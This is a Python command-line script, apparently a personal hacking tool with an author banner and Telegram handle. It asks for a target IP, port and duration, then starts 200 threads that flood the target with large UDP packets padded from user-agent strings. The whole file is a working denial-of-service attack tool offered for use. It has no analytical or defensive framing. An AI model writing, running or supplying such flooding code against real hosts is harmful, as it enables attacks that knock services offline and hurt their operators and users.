import signal
import sys
import socket
import random
import time
import threading
from colorama import init, Fore

init(autoreset=True)

attack_running = True
attack_status = "Waiting for input..."

def colored_text(text):
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
    colored = ''.join([random.choice(colors) + char for char in text])
    return colored

def show_banner():
    name = "Abo Zienb"
    print(Fore.BLACK + Fore.WHITE + "╔════════════════════════════════╗")
    print(Fore.WHITE + "║", colored_text(name).center(30), "║")
    print(Fore.BLACK + Fore.WHITE + "╚════════════════════════════════╝")
    print(Fore.GREEN + "Instructions:")
    print(Fore.CYAN + "1. Enter the IP of the target.")
    print(Fore.CYAN + "2. Enter the Port number of the target.")
    print(Fore.CYAN + "3. Enter the duration of the attack in seconds.")
    print(Fore.CYAN + "4. To stop the attack at any time, press CTRL+Z.")

def show_attack_status():
    global attack_status
    print(Fore.YELLOW + "\nCurrent Attack Status:")
    print(Fore.CYAN + f"Attack running: {attack_status}")

def get_input():
    print(Fore.YELLOW + "Enter Target IP:")
    ip = input(Fore.CYAN + "IP: ")
    
    print(Fore.YELLOW + "Enter Target Port:")
    port = input(Fore.CYAN + "Port: ")
    
    print(Fore.YELLOW + "Enter Attack Duration (seconds):")
    time = input(Fore.CYAN + "Duration: ")
    
    return ip, port, time

def read_user_agents(file):
    with open(file, 'r') as f:
        return [line.strip() for line in f.readlines() if "Mozilla" in line]

def udp_flood(ip, port, dur):
    user_agents = read_user_agents('ua.txt')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    randport = (True, False)[port == 0]
    clock = (lambda: 0, time.time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    
    while attack_running:
        user_agent = random.choice(user_agents)
        bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  
        port = (random.randint(1, 65535), port)[randport]
        
        if time.time() < duration:
            sock.sendto(bytes, (ip, port))
        else:
            break

def start_attack(ip, port, time, num_threads=200):
    global attack_status
    threads = []
    
    print(Fore.GREEN + f"\nAttack started on {ip}:{port} for {time} seconds.")
    attack_status = "Attack in progress..."
    
    for i in range(num_threads):
        thread = threading.Thread(target=udp_flood, args=(ip, port, time))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    
    attack_status = "Attack completed."
    print(Fore.GREEN + "Attack completed.")

def show_info():
    print(Fore.GREEN + "\nInformation:")
    print(Fore.CYAN + "Age: 29")
    print(Fore.CYAN + "Telegram: @eee_59")

def stop_attack(sig, frame):
    global attack_running
    attack_running = False
    print(Fore.RED + "\nAttack stopped successfully.")
    sys.exit(0)

signal.signal(signal.SIGTSTP, stop_attack)

if __name__ == "__main__":
    show_banner()
    show_info()
    
    ip, port, time = get_input()
    
    start_attack(ip, port, int(time))
